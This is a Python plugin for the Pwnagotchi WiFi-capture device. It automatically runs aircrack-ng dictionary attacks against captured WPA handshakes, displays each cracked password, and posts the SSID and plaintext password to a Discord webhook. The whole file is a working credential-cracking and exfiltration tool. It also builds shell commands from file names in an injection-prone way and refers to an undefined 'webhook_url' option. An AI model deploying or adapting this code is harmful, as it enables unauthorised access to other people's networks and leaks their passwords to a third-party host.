from pwnagotchi import plugins
import pwnagotchi
import logging
import subprocess
import string
import requests
import json
import re
import os

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /home/pi/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked
'''


class DiscoCracker(plugins.Plugin):
    __author__ = 'Mroxny'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'Run a quick dictionary scan against captured handshakes. Optionally send found passwords as a plain text over to Discord webhook.'
    __dependencies__ = {
        'apt': ['aircrack-ng'],
    }
    __defaults__ = {
        'enabled': False,
        'wordlist_folder': '/home/pi/wordlists/',
        'face': '(·ω·)',
        'api': None,
        'id': None,
    }

    def __init__(self):
        self.text_to_set = ""


    def on_loaded(self):
        logging.info('[discocracker] plugin loaded')

        if 'face' not in self.options:
            self.options['face'] = '(·ω·)'
        if 'wordlist_folder' not in self.options:
            self.options['wordlist_folder'] = '/home/pi/wordlists/'
        if 'enabled' not in self.options:
            self.options['enabled'] = False
        if 'api' not in self.options:
            self.options['api'] = None
        if 'id' not in self.options:
            self.options['id'] = None
            
        check = subprocess.run(
            ('/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \'{print $2, $3}\''), shell=True, stdout=subprocess.PIPE)
        check = check.stdout.decode('utf-8').strip()
        if check != "aircrack-ng <none>":
            logging.info('[discocracker] Found %s' %check)
        else:
            logging.warning('[discocracker] aircrack-ng is not installed!')


    def on_handshake(self, agent, filename, access_point, client_station):
        display = agent.view()
        result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake" | awk \'{print $2}\''),
                                shell=True, stdout=subprocess.PIPE)
        result = result.stdout.decode(
            'utf-8').translate({ord(c): None for c in string.whitespace})
        if not result:
            logging.info('[discocracker] No handshake')
        else:
            logging.info('[discocracker] Handshake confirmed')
            result2 = subprocess.run(('aircrack-ng -w `echo ' + self.options[
                'wordlist_folder'] + '*.txt | sed \'s/ /,/g\'` -l ' + filename + '.cracked -q -b ' + result + ' ' + filename + ' | grep KEY'),
                shell=True, stdout=subprocess.PIPE)
            result2 = result2.stdout.decode('utf-8').strip()
            logging.info('[discocracker] %s' %result2)
            if result2 != "KEY NOT FOUND":
                key = re.search(r'\[(.*)\]', result2)
                pwd = str(key.group(1))
                self.text_to_set = "Cracked password: " + pwd
                #logging.warning('!!! [discocracker] !!! %s' % self.text_to_set)
                display.set('face', self.options['face'])
                display.set('status', self.text_to_set)
                self.text_to_set = ""
                display.update(force=True)
                #plugins.on('cracked', access_point, pwd)
                if self.options['id'] != None and self.options['api'] != None:
                    self._send_message(filename, pwd)

    def _send_message(self, filename, pwd):
        try:
            security = "WPA"
            filename = filename
            base_filename = os.path.splitext(os.path.basename(filename))[0]
            ssid = base_filename.split('_')[0:-2]
            password = pwd
            
            message_text = f"SSID: {ssid}\nPassword: {password}"
            data = {
                'embeds': [
                    {
                    'title': '(·ω·) {} sniffed a new hash!'.format(pwnagotchi.name()), 
                    'color': 289968,
                    'description': '__**Captured WiFi info**__',
                    'fields': [
                        {
                            'name': 'Captured info',
                            'value': '`{}`'.format(message_text),
                            'inline': False
                        },
                        # {
                        #     'name': 'Hash:',
                        #     'value': '`{}`'.format(hash_data),
                        #     'inline': False
                        # },
                        # {
                        #     'name': '__**Location Information**__',
                        #     'value': '[GPS Waypoint]({})'.format(loc_url),
                        #     'inline': False
                        # },
                        # {
                        #     'name': 'Raw Coordinates:',
                        #     'value': '```{},{}```'.format(lat,lon),
                        #     'inline': False
                        # },
                    ]
                    }
                ]
            }
            requests.post(self.options['webhook_url'], files={'payload_json': (None, json.dumps(data))})
            logging.debug('[*] DiscoHash: Webhook sent!')

        except Exception as e:
            logging.error(f"[discocracker] Error sending notificationto Discord: {str(e)}")
           